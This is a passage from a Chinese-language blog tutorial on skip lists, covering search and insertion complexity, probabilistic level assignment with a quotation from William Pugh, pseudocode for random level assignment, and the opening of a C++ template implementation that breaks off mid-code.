In computer science, a skip list is a data structure that allows <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> search complexity as well as <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> insertion complexity within an ordered sequence of <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span> elements.  —— 维基百科</p>
<span id="more"></span>
<h3 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h3>
<p>由于本人知识有限，对于跳跃表的认识可能不够深入，不过还是想把自己的看法写下来…初学跳跃表时也许无法理解，不过当深入理解了跳跃表的原理时，一切都变得easy。比起手写一个红黑树代码跳跃表要简单得多，而且跳跃表也有很多实现例子的，如 Qt中的 <a href="https://doc.qt.io/archives/qt-4.8/qmap.html#details">QMap</a> ,MemSQL ,Redis… 虽然我都没有接触过…</p>
<h3 id="跳跃表"><a class="markdownIt-Anchor" href="#跳跃表"></a> 跳跃表</h3>
<p>一个简单的跳跃表结构<br />
<img src="/uploads/images/data_structure/skiplist_cpp/01.png" alt="" /></p>
<p><img src="/uploads/images/data_structure/skiplist_cpp/03.png" alt="" /></p>
<p>我们都知道，对一个 <code>有序链表</code> 执行查找的复杂度为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> ,而对数组使用<strong>二分查找</strong>的复杂度则是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，而跳跃表的出现就是为了解决<code>有序链表</code>的查找问题(当然还要其他更重要的作用)，使其复杂度将为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> ，不过最坏情况下却仍是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span><br />
注意: 跳跃表适用于有序链表。</p>
<p>利用跳跃表之后的查找、插入、删除复杂度如下</p>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:center">查找</th>
<th style="text-align:center">插入</th>
<th style="text-align:center">删除</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">平均情况</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
</tr>
<tr>
<td style="text-align:center">最坏情况</td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
<td style="text-align:center"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></td>
</tr>
</tbody>
</table>
<p>跳跃表是一个空间换时间的数据结构。</p>
<p>那么跳跃表是如何实现快速查找的呢？跳跃表通过建立 <code>索引节点</code> ，每次查找时，先通过最顶层索引节点一层层的向下寻找满足条件的节点，每次查找都有可能跨越到其他不相邻的节点，直到抵达最底层也就是原始层链表某处节点位置。</p>
<p>这里的 <strong>索引节点</strong> 其实就是一组节点地址，在new一个新节点时就分配好，然后在对每一层索引节点进行重组，使其前后串联起来，这样就形成了一个 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级链表且 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mi>M</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i\in(0,M-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69862em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> M为跳跃表的最高层级数MaxLevel，这样每一层级均可形成一条链。</p>
<p>要查找key为5的节点，那么从head开始一层层的查找，此次过程跳过了节点1和节点3，最后找到了节点5。<br />
<img src="/uploads/images/data_structure/skiplist_cpp/02.png" alt="" /></p>
<p>这里我们设置一个有序链表为带有head和tail节点，其中head节点的next指针就是有序链表的起始，而tail节点一般为<code>nullptr</code>，不过这里我们将tail作为<code>哨兵节点</code>，这样就无需处理<code>nullptr</code>问题了。</p>
<h4 id="插入删除"><a class="markdownIt-Anchor" href="#插入删除"></a> 插入/删除</h4>
<p>在一个<code>规则跳表结构</code>中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级链表有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>n</mi><msup><mn>2</mn><mi>i</mi></msup></mfrac></mrow><annotation encoding="application/x-tex">\frac{n}{2^i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7570857142857143em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 个节点，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>为最底层链表的总节点数。如:<br />
<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mo>→</mo><mi>i</mi></mrow><annotation encoding="application/x-tex">0 \rightarrow i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span> 层有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mfrac><mi>n</mi><mn>2</mn></mfrac><mo separator="true">,</mo><mfrac><mi>n</mi><mn>4</mn></mfrac><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><mfrac><mi>n</mi><msup><mn>2</mn><mi>i</mi></msup></mfrac></mrow><annotation encoding="application/x-tex">n,\frac{n}{2},\frac{n}{4},\cdots,\frac{n}{2^{i}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.040392em;vertical-align:-0.345em;"></span><span class="mord mathdefault">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7570857142857143em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p>
<p>也就是说，我们希望在插入时符合这种结构，而插入的节点属于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级链表的概率为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><msup><mn>2</mn><mi>i</mi></msup></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2^i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7570857142857143em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> (不难想出，插入节点属于0级链表概率永远为1，而属于1级链表的概率为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⋯</mo></mrow><annotation encoding="application/x-tex">\cdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.31em;vertical-align:0em;"></span><span class="minner">⋯</span></span></span></span>，属于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级链表的为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mn>1</mn><msup><mn>2</mn><mi>i</mi></msup></mfrac></mrow><annotation encoding="application/x-tex">\frac{1}{2^i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7570857142857143em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>)</p>
<p>这时来看看这段话，摘自William Pugh(就是他搞出了跳表)写的论文里的一段话。<br />
文末参考中有他关于跳表的论文</p>
<blockquote>
<p>原文<br />
Skip lists are a data structure that can be used in place of balanced trees.<br />
Skip lists use probabilistic balancing rather than strictly enforced balancing<br />
and as a result the algorithms for insertion and deletion in skip lists are<br />
much simpler and significantly faster than equivalent algorithms for<br />
balanced trees.<br />
翻译:<br />
跳跃表是一种可以用来代替平衡树的数据结构。<strong>跳跃表使用概率平衡而不是严格执行的平衡</strong>。因此，在跳跃表中插入和删除的算法是要比等效算法简单得多，也快得多平衡树。</p>
</blockquote>
<p>注意 <code>跳跃表使用概率平衡而不是严格执行的平衡</code> 这告诉我们，插入操作是动态的插入到不同层级的位置。因此，把一个新节点插入到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>级链表的概率为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>p</mi><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">p^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.019104em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span> (在一个规则跳表结构中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">p=0.5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span></span></span></span> )。</p>
<p>而这个动态插入法就利用到 随机数生成函数 来完成，一个好的随机数生成函数，能够使跳表结构达到最优的效果使其复杂度不会太高。</p>
<p>除此之外每一次插入/删除操作，都必须要维护跳表结构，也就是处理好链表节点的指向关系，避免混乱。</p>
<h4 id="级的分配"><a class="markdownIt-Anchor" href="#级的分配"></a> 级的分配</h4>
<p>不说那么多，级的分配可以利用一个随机数生成函数来完成。<br />
伪码:</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">randomLevel</span>()<br>    lvl := <span class="hljs-number">1</span><br>    -- <span class="hljs-built_in">random</span>() that returns a random value in [<span class="hljs-number">0.</span>.<span class="hljs-number">.1</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">random</span>() &lt; p <span class="hljs-keyword">and</span> lvl &lt; MaxLevel <span class="hljs-keyword">do</span><br>        lvl := lvl + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> lvl<br></code></pre></div></td></tr></table></figure>
<p>转化成C++代码</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">random_level</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> level= <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">double</span>)(<span class="hljs-built_in">rand</span>()%<span class="hljs-number">101</span>)/<span class="hljs-number">101</span>) &lt; (m_prob) <br>    &amp;&amp; level &lt; m_maxLevel) &#123;<br>        level++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> level;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>这里还要一个糟糕的随机数生成函数仅供参考</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">random_level</span><span class="hljs-params">()</span></span>&#123;<br>	<span class="hljs-keyword">int</span> level = <span class="hljs-built_in">rand</span>() % m_maxLevel + <span class="hljs-number">1</span>;<br>	<span class="hljs-keyword">return</span> level;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="c实现跳跃表"><a class="markdownIt-Anchor" href="#c实现跳跃表"></a> C++实现跳跃表</h3>
<p>OK，现在开始用C++实现跳跃表<br />
首先我们定义两个结构体，用于保存节点数据</p>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Element</span>&#123;</span><br>    KeyType key;<br>    ValueType value;<br>    <span class="hljs-built_in">Element</span>()&#123;&#125;<br>    <span class="hljs-built_in">Element</span>(KeyType key,<span class="hljs-keyword">const</span> ValueType&amp; value)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;key=key;<br>        <span class="hljs-keyword">this</span>-&gt;value=value;<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyType</span>,<span class="hljs-keyword">class</span> <span class="hljs-title">ValueType</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">skipNode</span>&#123;</span><br>    Element&lt;KeyType,ValueType&gt; element;<br>    skipNode**next;<br>    <span class="hljs-built_in">skipNode</span>(<span class="hljs-keyword">const</span> Element&lt;KeyType,ValueType&gt;&amp;theElement,<span class="hljs-keyword">int</span> size)&#123;<br>        <span 